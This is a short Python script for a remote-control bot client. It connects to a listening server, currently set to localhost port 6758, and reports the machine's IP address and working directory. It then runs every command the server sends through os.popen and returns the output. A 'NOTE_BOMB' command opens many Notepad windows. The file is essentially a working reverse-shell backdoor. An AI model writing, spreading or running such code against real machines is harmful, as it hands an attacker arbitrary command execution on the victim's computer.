import socket
import os

client_ip = socket.gethostbyname(socket.gethostname())
class Client:
    def __init__(self):
        self.host = '127.0.0.1'
        self.port = 6758
        self.server = socket.socket()

    def connect(self):
        self.server.connect((self.host,self.port))

    def send(self,text):
        self.server.send(str(text).encode('UTF-8'))

    def recv(self):
        self.msg = self.server.recv(1024)
        return self.msg.decode('UTF-8')

class Operate:
    def __init__(self):
        self.serv = Client()
        self.serv.connect()
        
    def hack(self):
        self.serv.send('{0} , {1} > '.format(client_ip,str(os.getcwd())))
        self.msg = self.serv.recv()
        if self.msg.split(' ')[0] == 'NOTE_BOMB':
            for i in range(int(self.msg.split(' ')[1])):
                data = os.popen('notepad.exe')

        else:
            data = os.popen(self.msg)
        self.serv.send('recived : '+str(data.read()))


run = True

bot = Operate()
while run:
    bot.hack()

